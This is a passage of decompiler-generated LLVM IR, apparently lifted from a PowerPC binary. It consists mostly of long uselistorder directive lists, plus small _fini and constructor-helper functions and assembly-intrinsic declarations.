680, 681, 682, 683, 684, 614, 613, 488, 62, 685, 411, 408, 686, 687, 688, 689, 405, 476, 690, 691, 692, 693, 694, 695, 696, 697, 698, 618, 617, 616, 615, 196, 195, 699, 477, 478, 620, 619, 700, 315, 706, 622, 621, 479, 708, 379, 415, 707, 480, 481, 482, 630, 629, 628, 627, 626, 625, 624, 623, 709, 710, 631, 427, 711, 2, 712, 632, 434, 886, 887, 433, 888, 889, 435, 436, 890, 891, 896, 634, 633, 490, 636, 635, 267, 491, 492, 493 }
  uselistorder label %dec_label_pc_1000ae78, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000aeb8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000aeb8

; uselistorder directives
  uselistorder i32* @r3, { 30, 31, 134, 135, 138, 136, 137, 0, 139, 140, 11, 141, 12, 142, 60, 61, 62, 143, 144, 145, 54, 146, 32, 13, 68, 69, 14, 33, 214, 215, 216, 147, 259, 260, 261, 148, 156, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 15, 194, 195, 196, 197, 198, 199, 200, 201, 203, 70, 71, 16, 72, 73, 74, 34, 217, 218, 219, 220, 221, 17, 204, 52, 35, 222, 223, 224, 225, 226, 227, 2, 1, 228, 229, 230, 36, 58, 273, 3, 37, 4, 51, 57, 267, 268, 269, 55, 75, 76, 77, 78, 79, 80, 81, 82, 63, 64, 65, 66, 67, 125, 126, 83, 53, 84, 29, 38, 205, 202, 206, 207, 208, 209, 210, 211, 212, 213, 39, 48, 49, 50, 270, 271, 5, 231, 232, 233, 234, 235, 40, 272, 41, 162, 163, 164, 165, 166, 167, 168, 42, 157, 158, 159, 160, 161, 85, 86, 169, 170, 87, 88, 236, 43, 237, 238, 239, 6, 10, 7, 240, 8, 241, 9, 242, 243, 244, 245, 246, 247, 44, 248, 249, 250, 251, 252, 253, 59, 262, 263, 264, 265, 266, 171, 172, 173, 174, 175, 176, 177, 178, 254, 255, 256, 149, 150, 151, 152, 153, 154, 155, 89, 90, 45, 91, 92, 93, 18, 94, 19, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 23, 22, 106, 107, 108, 109, 21, 20, 110, 111, 112, 113, 114, 115, 28, 116, 27, 117, 118, 26, 119, 120, 25, 121, 24, 122, 123, 124, 127, 128, 129, 131, 130, 132, 133, 257, 258, 46, 47, 56 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268480204, i32* @lr, align 4
  %v0_1000aec8 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000aec8

; uselistorder directives
  uselistorder i32 0, { 980, 981, 32, 984, 102, 982, 983, 57, 985, 986, 987, 990, 988, 0, 989, 991, 1, 82, 992, 162, 993, 22, 1193, 1194, 1009, 996, 999, 1000, 1001, 246, 1002, 1003, 1005, 1004, 1006, 1007, 1008, 1010, 1011, 1012, 994, 995, 997, 998, 103, 1013, 1015, 1016, 1014, 1017, 1018, 1019, 1020, 209, 859, 1021, 210, 860, 861, 104, 105, 868, 869, 85, 870, 871, 872, 873, 874, 875, 876, 106, 163, 878, 877, 107, 879, 880, 109, 108, 881, 247, 882, 883, 884, 111, 110, 885, 886, 214, 248, 887, 112, 1022, 1023, 1024, 1025, 1030, 1026, 61, 1031, 1032, 1027, 1028, 1029, 58, 59, 60, 1033, 249, 33, 34, 35, 204, 1035, 113, 1034, 250, 1036, 1037, 1038, 1039, 114, 1040, 86, 36, 1041, 164, 1042, 1043, 1044, 897, 165, 1195, 1196, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1197, 23, 1198, 116, 115, 1199, 1200, 1201, 1202, 117, 1052, 1053, 1054, 1055, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 24, 1056, 1414, 251, 1417, 64, 252, 215, 1418, 253, 1421, 1422, 62, 63, 1423, 2, 3, 862, 1391, 1392, 1393, 65, 66, 1394, 1415, 1416, 254, 255, 1070, 1063, 256, 67, 1064, 1065, 1066, 37, 1068, 1069, 1093, 1094, 1114, 1115, 1116, 1117, 216, 206, 207, 258, 1118, 1119, 1120, 1122, 166, 1125, 259, 217, 1127, 1129, 1130, 1131, 257, 218, 1124, 1121, 1123, 1126, 1133, 211, 1134, 1135, 1136, 4, 1150, 1151, 1152, 119, 118, 1153, 5, 120, 219, 898, 899, 900, 6, 1211, 1212, 168, 1214, 1213, 54, 7, 1215, 167, 8, 1216, 170, 1217, 55, 9, 1218, 169, 1154, 1155, 68, 1156, 1157, 1158, 1159, 1160, 1071, 1072, 1087, 260, 1088, 1089, 1090, 1219, 1220, 1221, 1222, 1223, 261, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 121, 122, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 38, 1246, 262, 83, 1247, 1248, 1249, 1250, 1251, 123, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 124, 1262, 1263, 1264, 239, 240, 1265, 1266, 1267, 25, 10, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 87, 1424, 1425, 1426, 1429, 1427, 11, 171, 1288, 1287, 172, 1286, 88, 1289, 1290, 1291, 125, 1292, 1395, 1419, 1420, 1161, 1162, 220, 1163, 1430, 126, 1431, 1396, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1128, 263, 264, 1454, 1455, 265, 1456, 1476, 173, 1477, 266, 1468, 12, 1440, 1441, 127, 1397, 1398, 267, 221, 268, 1399, 1400, 71, 72, 1401, 1402, 1403, 269, 1404, 1405, 1406, 69, 70, 1407, 1408, 1442, 1443, 1444, 1445, 1446, 1447, 128, 1453, 960, 961, 962, 963, 964, 129, 965, 966, 967, 241, 968, 270, 969, 222, 271, 272, 273, 1409, 274, 1410, 275, 888, 889, 890, 130, 891, 131, 901, 902, 174, 89, 101, 903, 904, 13, 976, 892, 893, 132, 894, 895, 896, 1166, 1168, 39, 1169, 73, 1170, 1167, 1164, 1165, 14, 909, 905, 906, 907, 908, 175, 15, 1139, 1137, 1138, 176, 1140, 1141, 910, 911, 912, 913, 914, 276, 915, 916, 1171, 1172, 277, 1173, 133, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 242, 243, 278, 1174, 1175, 177, 1176, 1177, 1178, 1179, 1185, 1186, 1187, 1188, 134, 1189, 1190, 1191, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 279, 1465, 16, 135, 136, 1293, 1294, 26, 27, 223, 28, 1295, 178, 1296, 1297, 179, 280, 1298, 1180, 1181, 1182, 1183, 1184, 1299, 1300, 180, 1067, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1469, 1470, 1471, 74, 1472, 1473, 1474, 1475, 137, 1301, 1302, 1303, 1304, 1305, 1306, 138, 1091, 1073, 1074, 1075, 1076, 1077, 1084, 1080, 1081, 1082, 1083, 181, 1085, 1086, 1078, 17, 75, 1079, 917, 1092, 918, 919, 1307, 1308, 90, 1309, 1310, 1311, 1312, 1313, 212, 1314, 1315, 1316, 139, 1317, 1318, 1319, 1320, 1321, 140, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 141, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 40, 156, 157, 182, 1340, 1341, 142, 1342, 281, 1343, 1344, 282, 1347, 147, 143, 1345, 1346, 284, 1348, 1349, 1350, 1352, 148, 1353, 18, 19, 149, 150, 144, 145, 1354, 1355, 146, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 283, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 863, 1375, 1376, 29, 1378, 76, 91, 151, 285, 1381, 244, 1382, 1377, 1379, 1380, 1383, 1384, 152, 864, 865, 84, 56, 81, 1351, 183, 1448, 1450, 1449, 185, 153, 1452, 1451, 184, 224, 1095, 1096, 1097, 154, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 286, 1107, 1108, 1109, 1110, 1111, 1112, 213, 1385, 1386, 287, 1113, 1057, 1058, 1059, 1060, 1061, 1062, 1428, 288, 970, 972, 1412, 920, 1413, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 978, 1132, 1466, 1467, 291, 290, 932, 933, 77, 78, 21, 187, 20, 188, 186, 295, 934, 30, 935, 41, 158, 293, 294, 42, 159, 226, 225, 292, 189, 296, 297, 289, 936, 937, 938, 940, 205, 939, 941, 942, 300, 301, 298, 299, 943, 303, 304, 232, 227, 228, 229, 230, 231, 944, 302, 79, 305, 306, 945, 946, 947, 307, 948, 308, 309, 92, 93, 949, 94, 43, 195, 194, 193, 950, 951, 95, 44, 192, 191, 190, 952, 310, 96, 45, 201, 97, 46, 47, 200, 199, 160, 953, 98, 48, 198, 311, 954, 99, 49, 197, 100, 50, 196, 312, 955, 233, 313, 234, 956, 314, 957, 315, 959, 202, 958, 161, 235, 317, 236, 316, 318, 319, 971, 320, 321, 155, 323, 973, 31, 237, 238, 322, 80, 974, 975, 324, 325, 326, 51, 52, 977, 327, 208, 53, 979, 1192, 1387, 1388, 245, 1389, 1390, 203, 1486, 1487, 1488, 1411, 866, 867, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511 }
  uselistorder i32* @lr, { 5, 149, 150, 151, 152, 153, 154, 155, 291, 392, 393, 394, 156, 160, 157, 158, 159, 164, 165, 161, 162, 163, 166, 167, 168, 169, 170, 6, 7, 8, 11, 9, 10, 171, 174, 172, 1, 173, 0, 175, 178, 179, 176, 177, 180, 181, 182, 183, 184, 185, 186, 187, 17, 292, 293, 188, 189, 190, 191, 294, 295, 296, 297, 192, 399, 400, 401, 402, 363, 395, 396, 397, 398, 193, 198, 213, 199, 200, 201, 214, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 238, 239, 241, 243, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 259, 260, 261, 18, 19, 20, 21, 298, 299, 300, 403, 301, 302, 202, 203, 208, 209, 210, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 404, 405, 315, 316, 262, 263, 406, 407, 416, 417, 420, 421, 422, 423, 424, 437, 439, 441, 418, 419, 364, 365, 366, 367, 368, 369, 370, 408, 414, 415, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 12, 13, 22, 15, 23, 14, 16, 264, 266, 265, 24, 25, 26, 27, 28, 29, 267, 268, 269, 256, 257, 258, 244, 68, 97, 240, 237, 121, 242, 122, 123, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 283, 284, 285, 286, 287, 425, 426, 427, 428, 429, 432, 433, 434, 317, 318, 319, 320, 281, 282, 440, 438, 321, 322, 323, 211, 204, 206, 207, 205, 30, 212, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 3, 4, 338, 409, 410, 411, 412, 413, 435, 436, 215, 216, 217, 218, 219, 220, 221, 222, 352, 353, 31, 194, 195, 196, 197, 356, 32, 33, 34, 35, 36, 430, 431, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 69, 75, 70, 71, 72, 73, 74, 2, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 288, 289, 290, 354, 355, 357, 358, 359, 360, 361, 362, 387, 388, 389, 390, 391 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr
